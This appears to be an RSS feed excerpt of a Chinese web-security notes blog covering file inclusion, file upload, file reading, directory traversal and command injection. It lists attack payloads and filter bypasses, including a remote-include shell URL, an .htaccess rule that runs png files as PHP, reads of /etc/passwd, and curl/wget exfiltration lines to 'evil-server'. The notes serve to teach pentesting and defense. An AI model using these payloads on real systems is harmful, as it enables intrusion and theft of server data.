&lt;/ul&gt;
&lt;p&gt;其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试&lt;/p&gt;
&lt;h2 id=&#34;触发sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#触发sink&#34;&gt;#&lt;/a&gt; 触发 Sink&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PHP
&lt;ul&gt;
&lt;li&gt;include
&lt;ul&gt;
&lt;li&gt;在包含过程中出错会报错，不影响执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;include_once
&lt;ul&gt;
&lt;li&gt;仅包含一次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require
&lt;ul&gt;
&lt;li&gt;在包含过程中出错，就会直接退出，不执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require_once&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h2&gt;
&lt;p&gt;常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式&lt;/p&gt;
&lt;h3 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h3&gt;
&lt;p&gt;如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过&lt;/p&gt;
&lt;h3 id=&#34;特殊字符绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊字符绕过&#34;&gt;#&lt;/a&gt; 特殊字符绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;某些情况下，读文件支持使用 Shell 通配符，如  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;  等&lt;/li&gt;
&lt;li&gt;url 中 使用  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;  可能会影响 include 包含的结果&lt;/li&gt;
&lt;li&gt;某些情况下，unicode 编码不同但是字形相近的字符有同一个效果&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
&lt;p&gt;几乎是最常用的方法，条件是  &lt;code&gt;magic_quotes_gpc&lt;/code&gt;  关闭，而且 php 版本小于 5.3.4。&lt;/p&gt;
&lt;h3 id=&#34;长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度截断&#34;&gt;#&lt;/a&gt; 长度截断&lt;/h3&gt;
&lt;p&gt;Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。&lt;/p&gt;
&lt;p&gt;msdn 定义  &lt;code&gt;#define MAX_PATH 260&lt;/code&gt; ，其中第 260 个字符为字符串结尾的  &lt;code&gt;\0&lt;/code&gt;  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。&lt;/p&gt;
&lt;p&gt;获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255&lt;/p&gt;
&lt;p&gt;那么在长度有限的时候， &lt;code&gt;././././&lt;/code&gt;  (n 个) 的形式就可以通过这个把路径爆掉&lt;/p&gt;
&lt;p&gt;在 php 代码包含中，这种绕过方式要求 php 版本 &amp;lt; php 5.2.8&lt;/p&gt;
&lt;h3 id=&#34;伪协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议绕过&#34;&gt;#&lt;/a&gt; 伪协议绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;远程包含：要求  &lt;code&gt;allow_url_fopen=On&lt;/code&gt;  且  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ， payload 为  &lt;code&gt;?file=[http|https|ftp]://websec.wordpress.com/shell.txt&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ，payload 为  &lt;code&gt;?file=php://input&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;Base64: 使用 Base64 伪协议读取文件，payload 为  &lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;data: 使用 data 伪协议读取文件，payload 为  &lt;code&gt;?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=&lt;/code&gt;  的形式，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议绕过&#34;&gt;#&lt;/a&gt; 协议绕过&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;allow_url_fopen&lt;/code&gt;  和  &lt;code&gt;allow_url_include&lt;/code&gt;  主要是针对  &lt;code&gt;http&lt;/code&gt;   &lt;code&gt;ftp&lt;/code&gt;  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=&#34;&gt;Exploit with PHP Protocols&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==&#34;&gt;lfi cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/</guid>
            <title>文件上传</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/</link>
            <category>目录</category>
            <category>上传</category>
            <pubDate>Sat, 26 Nov 2022 20:58:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;文件类型检测绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件类型检测绕过&#34;&gt;#&lt;/a&gt; 文件类型检测绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改请求绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改请求绕过&#34;&gt;#&lt;/a&gt; 更改请求绕过&lt;/h2&gt;
&lt;p&gt;有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如  &lt;code&gt;Content-Type&lt;/code&gt;  等，这种检查同样可以通过修改网络请求绕过。&lt;/p&gt;
&lt;h2 id=&#34;magic检测绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#magic检测绕过&#34;&gt;#&lt;/a&gt; Magic 检测绕过&lt;/h2&gt;
&lt;p&gt;有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;十六进制值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;JPG&lt;/td&gt;
&lt;td&gt;FF D8 FF E0 00 10 4A 46 49 46&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF&lt;/td&gt;
&lt;td&gt;47 49 46 38 39 61&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG&lt;/td&gt;
&lt;td&gt;89 50 4E 47&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TIF&lt;/td&gt;
&lt;td&gt;49 49 2A 00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;BMP&lt;/td&gt;
&lt;td&gt;42 4D&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;后缀绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀绕过&#34;&gt;#&lt;/a&gt; 后缀绕过&lt;/h2&gt;
&lt;p&gt;部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。&lt;/p&gt;
&lt;p&gt;php 由于历史原因，部分解释器可能支持符合正则  &lt;code&gt;/ph(p[2-7]?|t(ml)?)/&lt;/code&gt;  的后缀，如  &lt;code&gt;php&lt;/code&gt;  /  &lt;code&gt;php5&lt;/code&gt;  /  &lt;code&gt;pht&lt;/code&gt;  /  &lt;code&gt;phtml&lt;/code&gt;  /  &lt;code&gt;shtml&lt;/code&gt;  /  &lt;code&gt;pwml&lt;/code&gt;  /  &lt;code&gt;phtm&lt;/code&gt;  等 可在禁止上传 php 文件时测试该类型。&lt;/p&gt;
&lt;p&gt;jsp 引擎则可能会解析  &lt;code&gt;jspx&lt;/code&gt;  /  &lt;code&gt;jspf&lt;/code&gt;  /  &lt;code&gt;jspa&lt;/code&gt;  /  &lt;code&gt;jsw&lt;/code&gt;  /  &lt;code&gt;jsv&lt;/code&gt;  /  &lt;code&gt;jtml&lt;/code&gt;  等后缀，asp 支持  &lt;code&gt;asa&lt;/code&gt;  /  &lt;code&gt;asax&lt;/code&gt;  /  &lt;code&gt;cer&lt;/code&gt;  /  &lt;code&gt;cdx&lt;/code&gt;  /  &lt;code&gt;aspx&lt;/code&gt;  /  &lt;code&gt;ascx&lt;/code&gt;  /  &lt;code&gt;ashx&lt;/code&gt;  /  &lt;code&gt;asmx&lt;/code&gt;  /  &lt;code&gt;asp&amp;#123;80-90&amp;#125;&lt;/code&gt;  等后缀。&lt;/p&gt;
&lt;p&gt;除了这些绕过，其他的后缀同样可能带来问题，如  &lt;code&gt;vbs&lt;/code&gt;  /  &lt;code&gt;asis&lt;/code&gt;  /  &lt;code&gt;sh&lt;/code&gt;  /  &lt;code&gt;reg&lt;/code&gt;  /  &lt;code&gt;cgi&lt;/code&gt;  /  &lt;code&gt;exe&lt;/code&gt;  /  &lt;code&gt;dll&lt;/code&gt;  /  &lt;code&gt;com&lt;/code&gt;  /  &lt;code&gt;bat&lt;/code&gt;  /  &lt;code&gt;pl&lt;/code&gt;  /  &lt;code&gt;cfc&lt;/code&gt;  /  &lt;code&gt;cfm&lt;/code&gt;  /  &lt;code&gt;ini&lt;/code&gt;  等。&lt;/p&gt;
&lt;h2 id=&#34;系统命名绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统命名绕过&#34;&gt;#&lt;/a&gt; 系统命名绕过&lt;/h2&gt;
&lt;p&gt;在 Windows 系统中，上传  &lt;code&gt;index.php.&lt;/code&gt;  会重命名为  &lt;code&gt;.&lt;/code&gt;  ，可以绕过后缀检查。 也可尝试  &lt;code&gt;index.php%20&lt;/code&gt;  ，  &lt;code&gt;index.php:1.jpg&lt;/code&gt;   &lt;code&gt;index.php::$DATA&lt;/code&gt;  等。 在 Linux 系统中，可以尝试上传名为  &lt;code&gt;index.php/.&lt;/code&gt;  或  &lt;code&gt;./aa/../index.php/.&lt;/code&gt;  的文件&lt;/p&gt;
&lt;h2 id=&#34;userini&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#userini&#34;&gt;#&lt;/a&gt; .user.ini&lt;/h2&gt;
&lt;p&gt;在 php 执行的过程中，除了主  &lt;code&gt;php.ini&lt;/code&gt;  之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER [&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。  &lt;code&gt;.user.ini&lt;/code&gt;  中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用  &lt;code&gt;.user.ini&lt;/code&gt;  加上非 php 后缀的文件构造一个 shell，比如  &lt;code&gt;auto_prepend_file=01.gif&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;waf绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf绕过&#34;&gt;#&lt;/a&gt; WAF 绕过&lt;/h2&gt;
&lt;p&gt;有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。&lt;/p&gt;
&lt;p&gt;另外，Waf 和 Web 系统对  &lt;code&gt;boundary&lt;/code&gt;  的处理不一致，可以使用错误的  &lt;code&gt;boundary&lt;/code&gt;  来完成绕过。&lt;/p&gt;
&lt;h2 id=&#34;竞争上传绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#竞争上传绕过&#34;&gt;#&lt;/a&gt; 竞争上传绕过&lt;/h2&gt;
&lt;p&gt;有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell 的文件并尝试访问，多次之后即可获得 Shell。&lt;/p&gt;
&lt;h1 id=&#34;攻击技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击技巧&#34;&gt;#&lt;/a&gt; 攻击技巧&lt;/h1&gt;
&lt;h2 id=&#34;apache重写getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache重写getshell&#34;&gt;#&lt;/a&gt; Apache 重写 GetShell&lt;/h2&gt;
&lt;p&gt;Apache 可根据是否允许重定向考虑上传.htaccess&lt;/p&gt;
&lt;p&gt;内容为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .png
php_flag engine 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以用 png 或者其他后缀的文件做 php 脚本了&lt;/p&gt;
&lt;h2 id=&#34;软链接任意读文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#软链接任意读文件&#34;&gt;#&lt;/a&gt; 软链接任意读文件&lt;/h2&gt;
&lt;p&gt;上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果&lt;/p&gt;
&lt;h1 id=&#34;防护技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护技巧&#34;&gt;#&lt;/a&gt; 防护技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用白名单限制上传文件的类型&lt;/li&gt;
&lt;li&gt;使用更严格的文件类型检查方式&lt;/li&gt;
&lt;li&gt;限制 Web Server 对上传文件夹的解析&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4ODQ2NC5odG1s&#34;&gt;构造优质上传漏洞 Fuzz 字典&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/</guid>
            <title>文件读取</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/</link>
            <category>目录</category>
            <category>读取</category>
            <pubDate>Sat, 26 Nov 2022 20:49:44 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;考虑读取可能有敏感信息的文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户目录下的敏感文件
&lt;ul&gt;
&lt;li&gt;.bash_history&lt;/li&gt;
&lt;li&gt;.zsh_history&lt;/li&gt;
&lt;li&gt;.profile&lt;/li&gt;
&lt;li&gt;.bashrc&lt;/li&gt;
&lt;li&gt;.gitconfig&lt;/li&gt;
&lt;li&gt;.viminfopasswd&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用的配置文件
&lt;ul&gt;
&lt;li&gt;/etc/apache2/apache2.conf&lt;/li&gt;
&lt;li&gt;/etc/nginx/nginx.conf&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用的日志文件
&lt;ul&gt;
&lt;li&gt;/var/log/apache2/access.log&lt;/li&gt;
&lt;li&gt;/var/log/nginx/access.log&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;站点目录下的敏感文件
&lt;ul&gt;
&lt;li&gt;.svn/entries&lt;/li&gt;
&lt;li&gt;.git/HEAD&lt;/li&gt;
&lt;li&gt;WEB-INF/web.xml&lt;/li&gt;
&lt;li&gt;.htaccess&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特殊的备份文件
&lt;ul&gt;
&lt;li&gt;.swp&lt;/li&gt;
&lt;li&gt;.swo&lt;/li&gt;
&lt;li&gt;.bak&lt;/li&gt;
&lt;li&gt;index.php~&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python 的 Cache
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__pycache__\__init__.cpython-35.pyc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/</guid>
            <title>目录穿越</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/</link>
            <category>绕过</category>
            <category>遍历</category>
            <pubDate>Sat, 26 Nov 2022 20:44:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;目录穿越（也被称为目录遍历 /directory traversal/path traversal）是通过使用  &lt;code&gt;../&lt;/code&gt;  等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。&lt;/p&gt;
&lt;h1 id=&#34;攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击载荷&#34;&gt;#&lt;/a&gt; 攻击载荷&lt;/h1&gt;
&lt;h2 id=&#34;url参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url参数&#34;&gt;#&lt;/a&gt; URL 参数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;../&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;..\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;..;/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nginx-off-by-slash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx-off-by-slash&#34;&gt;#&lt;/a&gt; Nginx Off by Slash&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://vuln.site.com/files../&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;unc-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unc-bypass&#34;&gt;#&lt;/a&gt; UNC Bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\\localhost\c$\windows\win.ini&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;单次替换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;...//&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;URL 编码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16 位 Unicode 编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\u002e&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;超长 UTF-8 编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\%e0%40%ae&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;p&gt;在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。&lt;/p&gt;
&lt;p&gt;若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2ZpbGUtcGF0aC10cmF2ZXJzYWw=&#34;&gt;Directory traversal by portswigger&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QYXRoX1RyYXZlcnNhbA==&#34;&gt;Path Traversal by OWASP&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9ncy5tc2RuLm1pY3Jvc29mdC5jb20vamVyZW15a3VobmUvMjAxNi8wNC8yMS9wYXRoLW5vcm1hbGl6YXRpb24v&#34;&gt;path normalization&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS91cy0xOC9XZWQtQXVndXN0LTgvdXMtMTgtT3JhbmdlLVRzYWktQnJlYWtpbmctUGFyc2VyLUxvZ2ljLVRha2UtWW91ci1QYXRoLU5vcm1hbGl6YXRpb24tT2ZmLUFuZC1Qb3AtMGRheXMtT3V0LTIucGRm&#34;&gt;Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</guid>
            <title>命令注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</link>
            <category>注入</category>
            <category>函数</category>
            <category>绕过</category>
            <pubDate>Sat, 26 Nov 2022 17:30:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。&lt;/p&gt;
&lt;p&gt;该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。&lt;/p&gt;
&lt;h1 id=&#34;常见危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见危险函数&#34;&gt;#&lt;/a&gt; 常见危险函数&lt;/h1&gt;
&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;system&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;passthru&lt;/li&gt;
&lt;li&gt;shell_exec&lt;/li&gt;
&lt;li&gt;popen&lt;/li&gt;
&lt;li&gt;proc_open&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;system&lt;/li&gt;
&lt;li&gt;popen&lt;/li&gt;
&lt;li&gt;subprocess.call&lt;/li&gt;
&lt;li&gt;spawn&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.Runtime.getRuntime().exec(command)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见注入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见注入方式&#34;&gt;#&lt;/a&gt; 常见注入方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;分号分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;  分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  管道符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\r\n&lt;/code&gt;   &lt;code&gt;%d0%a0&lt;/code&gt;  换行&lt;/li&gt;
&lt;li&gt;反引号解析&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$()&lt;/code&gt;  替换&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;无回显技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无回显技巧&#34;&gt;#&lt;/a&gt; 无回显技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;bash 反弹 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 带外数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;http 带外&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wget http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无带外时利用  &lt;code&gt;sleep&lt;/code&gt;  或其他逻辑构造布尔条件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见绕过方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过方式&#34;&gt;#&lt;/a&gt; 常见绕过方式&lt;/h1&gt;
&lt;h2 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  符号  &lt;code&gt;cat&amp;lt;123&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\t&lt;/code&gt;  /  &lt;code&gt;%09&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;   其中 {} 用来截断，比如 &lt;code&gt;cat$IFS2&lt;/code&gt;  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;黑名单绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单绕过&#34;&gt;#&lt;/a&gt; 黑名单绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a=l;b=s;$a$b&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;base64  &lt;code&gt;echo &amp;quot;bHM=&amp;quot; | base64 -d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/?in/?s&lt;/code&gt;  =&amp;gt;  &lt;code&gt;/bin/ls&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;连接符  &lt;code&gt;cat /etc/pass&#39;w&#39;d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;未定义的初始化变量  &lt;code&gt;cat$x /etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制绕过&#34;&gt;#&lt;/a&gt; 长度限制绕过&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;wget\
&amp;gt;foo.\
&amp;gt;com
ls -t&amp;gt;a
sh a
&lt;/code&gt;&lt;/pre&gt;
